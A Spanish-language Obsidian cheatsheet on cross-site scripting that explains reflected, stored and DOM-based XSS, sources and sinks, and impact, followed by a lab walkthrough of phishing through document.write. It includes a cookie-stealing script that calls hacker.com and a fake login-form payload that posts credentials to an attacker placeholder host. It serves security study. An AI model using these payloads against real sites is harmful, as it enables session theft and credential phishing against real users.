---
aliases:
tags:
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: CheatSheet
linked:
  - "[[XSS - HTML Básico]]"
  - "[[XSS - Etiqueta <script> Estándar]]"
  - "[[XSS - Manejadores de Eventos HTML]]"
  - "[[XSS - Pseudo-protocolos]]"
  - "[[XSS - Manipulación de Sources y Sinks (DOM-based)]]"
  - "[[XSS - Payloads Polyglot]]"
  - "[[XSS - Explotación Out-of-Band (Blind XSS)]]"
  - "[[XSS - Explotación de Mutaciones del Navegador (mXSS)]]"
  - "[[XSS - Escape de Contexto en Atributos]]"
  - "[[XSS - Filtros XSS y WAF mediante Codificaciones Múltiples]]"
  - "[[XSS - CWES]]"
  - "[[XSS - Discovery (Detección)]]"
  - "[[XSS - Prevención (Defensa)]]"
  - "[[XSS - Session Hijacking (Cookie Stealing)]]"
  - "[[XSS alert 1 vs window.origin]]"
---
# Cross-Site Scripting (XSS) 

## Cheatsheet

### 1. Inyecciones Clásicas

````tabs
tab: **Inyección Directa de HTML Básico**
![[XSS - HTML Básico#^xss-html]]

tab: **Inyección de Etiquetas <script>**
![[XSS - Etiqueta <script> Estándar#^xss-script]]

````

### 2. Manipulación de Contextos y Eventos

````tabs
tab: **Inyección de Manejadores de Eventos HTML**
![[XSS - Manejadores de Eventos HTML#^xss-eventos]]

tab: **Inyección de Pseudo-Protocolos**
![[XSS - Pseudo-protocolos#^xss-pseudo]]

tab: **Inyección de Escape de Contexto en Atributos**
![[XSS - Escape de Contexto en Atributos#^xss-atributos]]

````

### 3. Técnicas de Evasión

````tabs
tab: **Evasion de Filtros y WAF mediante Codificaciones Múltiples**
![[XSS - Filtros XSS y WAF mediante Codificaciones Múltiples#^xss-waf]]

tab: **Inyección de Payloads Polyglot**
![[XSS - Payloads Polyglot#^xss-polyglot]]

````

### 4. Explotación del Lado del Cliente

````tabs
tab: **Manipulación directa de _Sources_ y _Sinks_**
![[XSS - Manipulación de Sources y Sinks (DOM-based)#^xss-sources]]

tab: **Explotación Out-of-Band (Blind XSS)**
![[XSS - Explotación Out-of-Band (Blind XSS)#^xss-blind]]

tab: **Explotación mediante mutaciones del navegador (mXSS)**
![[XSS - Explotación de Mutaciones del Navegador (mXSS)#^xss-mxss]]

````

---

## Descubrimiento (Detección)

````tabs
tab: **Descubrimiento Automatizado**
![[XSS - Discovery (Detección)#Descubrimiento Automatizado]]

tab: **Descubrimiento Manual**
![[XSS - Discovery (Detección)#Descubrimiento Manual]]

tab: **Revisión de Código**
![[XSS - Discovery (Detección)#Revisión de Código]]
````
---

## Overview

Las vulnerabilidades de HTML Injection a menudo pueden usarse para realizar ataques **Cross-Site Scripting (XSS)** inyectando código JavaScript que se ejecuta en el cliente. Si podemos ejecutar código en la máquina de la víctima, podemos potencialmente acceder a su cuenta o incluso a su equipo. XSS es muy similar a HTML Injection, pero **XSS inyecta JavaScript** para ataques más avanzados en el cliente, en lugar de solo HTML.

### XSS Reflejado (Reflected)

El script malicioso **no se guarda** en el servidor; viaja en la URL y el servidor lo "refleja" en la respuesta.
- **Vector:** Enlaces maliciosos (Phishing).
- **Persistencia:** Nula (requiere que la víctima haga clic cada vez).

> [!EXAMPLE] Ejemplo de URL
> http://sitio.com/buscar?q=<script>alert('XSS')</script>

**Cómo funciona:**
1. La víctima hace clic en el link.
2. El servidor recibe la `q` y la pone en el HTML de respuesta: `Resultados para: <script>...</script>`.
3. El navegador ejecuta el script.

---

### XSS Almacenado (Stored)

El script malicioso **se guarda** permanentemente en el servidor (Base de datos, foros, comentarios).
- **Vector:** Formularios de comentarios, perfiles de usuario, posts.
- **Persistencia:** Alta (afecta a cualquiera que visite la página).

> [!FAIL] Código Vulnerable (Ejemplo)
> Un atacante comenta en un blog:
> ```HTML
> Excelente post!
> <script>
>   // Envía las cookies de quien lea esto al atacante
>   new Image().src = "http://hacker.com/robo.php?c=" + document.cookie;
> </script>
> ```

**Cómo funciona:**
1. El servidor guarda el comentario.
2. Cuando otros usuarios (o el administrador) cargan el post, el servidor sirve el comentario con el script.
3. El script se ejecuta automáticamente sin que el usuario haga nada extraño.


---

### XSS basado en DOM (DOM-based)

Ocurre enteramente en el **navegador**. El servidor envía la página bien, pero el Javascript del sitio manipula los datos de forma insegura.
- **Fuente (Source):** `location.hash`, `location.search`, `document.referrer`.
- **Sumidero (Sink):** `innerHTML`, `document.write`, `eval()`.

> [!BUG] Ejemplo Javascript
> ```JavaScript
> // Toma el texto después del # en la URL y lo pega en el HTML
> var mensaje = location.hash.substring(1);
> document.getElementById('saludo').innerHTML = mensaje;
> ```
> Si la URL es `sitio.com#<img src=x onerror=alert(1)>`, se ejecuta el ataque.


---

## Diferencias Clave

| **Tipo de XSS** | **¿Dónde reside la vulnerabilidad?**   | **¿Se almacena en el servidor?** | **Método de entrega principal**           |
| --------------- | -------------------------------------- | -------------------------------- | ----------------------------------------- |
| **Stored**      | Servidor (procesamiento de datos)      | Sí                               | Navegación normal a la página afectada    |
| **Reflected**   | Servidor (procesamiento de respuestas) | No                               | Enlace manipulado enviado por el atacante |
| **DOM-based**   | Cliente (JavaScript en el navegador)   | No                               | Modificación del entorno local / URL      |


Lo que define si es DOM, Reflejado o Almacenado es **qué parte del sistema cometió el error de colocar el _payload_ en el código de la página.**

- **Como Stored XSS:** Se crea un perfil en una red social y en la sección "Biografía" se escribe `<img src="" onerror=alert(window.origin)>`. El servidor lo guarda en su base de datos. Cada vez que alguien visite el perfil, el servidor inyectará ese código en el HTML y la alerta saltará.

- **Como Reflected XSS:** En un buscador defectuoso, al buscar la palabra `<img src="" onerror=alert(window.origin)>`. El servidor recibe la petición y devuelve una página web que dice: `<h1>Resultados para: <img src="" onerror=alert(window.origin)></h1>`. El servidor lo reflejó.

- **Como DOM-based XSS:** Entras a la URL `sitio.com/perfil?nombre=<img src="" onerror=alert(window.origin)>`. El servidor devuelve una página HTML totalmente limpia. Sin embargo, el desarrollador escribió un código JavaScript en el _frontend_ que toma el parámetro `nombre` de la URL y lo mete directamente en la página usando `document.body.innerHTML = nombre;`. Aquí, el culpable fue el JavaScript local.


---

## Para entender XSS

**Base del navegador**
- Cómo funciona el DOM (qué es un nodo, cómo el navegador construye el árbol HTML)
- Diferencia entre HTML parseado y JavaScript ejecutado
- Cómo el navegador decide qué es "código" y qué es "texto"

**Los tres tipos de XSS**
- Reflected (el servidor devuelve tu input en la respuesta)
- Stored (el payload se guarda en una base de datos)
- DOM-based (todo pasa en el cliente, sin pasar por el servidor)

**Sources y Sinks**
- Sources: `location.search`, `location.hash`, `document.referrer`, `document.cookie`, `window.name`
- Los sinks más comunes: `innerHTML`, `document.write`, `eval()`, `setTimeout()`, `src`, `href`, `outerHTML`

**Contextos de inyección**
- No es lo mismo inyectar dentro de una etiqueta HTML, que dentro de un atributo, que dentro de un bloque JavaScript. Cada contexto requiere un payload diferente.

**Encoding y bypass**
- HTML encoding, URL encoding, JavaScript encoding
- Por qué algunos filtros se pueden bypassear cambiando el encoding

**Content Security Policy (CSP)**
- Qué es y cómo intenta mitigar XSS
- Por qué a veces está mal configurada y se puede bypassear

**Impacto real**
- Robo de cookies de sesión
- Keylogging
- Redirección a sitios maliciosos
- CSRF forzado desde XSS

---

## Ejemplo práctico: Phishing vía XSS (document.write)

### Los pasos explicados

#### 1. Encontrar el payload XSS
Hay un formulario con un campo de URL. Al probar el payload:
```
'><script>alert(1)</script>
```
Se confirma que la página es vulnerable a XSS — el `'>`cierra el atributo HTML y permite inyectar código JavaScript.

---

#### 2. Preparar el ataque de phishing
Una vez que sabés que hay XSS, usás `document.write()` para **reemplazar el contenido de la página** con un formulario de login falso que envía las credenciales a **tu propio servidor**.

```javascript
'><script>document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

---

#### 3. Montar tu servidor receptor
Creás un archivo `index.php` en tu máquina que **guarda las credenciales** en un archivo de texto cuando alguien las envía, y luego redirige a la página original (para que no parezca sospechoso).

```
php -S 0.0.0.0:8080
```

---

#### 4. Enviar la URL maliciosa a la víctima
En `/send.php` pegás la URL completa con el payload XSS codificado. La "víctima" visita esa URL, ve el formulario falso, ingresa sus credenciales y **vos las recibís en tu servidor**.

---

#### 5. Resultado
Tu servidor captura: `admin:p1zd0nt57341myp455`, y con eso te logueas en `/login.php` para obtener la flag.

---

### Resumen del flujo

```
Tú inyectas URL maliciosa → Víctima ve formulario falso
→ Víctima ingresa credenciales → Van a TU servidor
→ Tú usás esas credenciales → Obtenés la flag
```
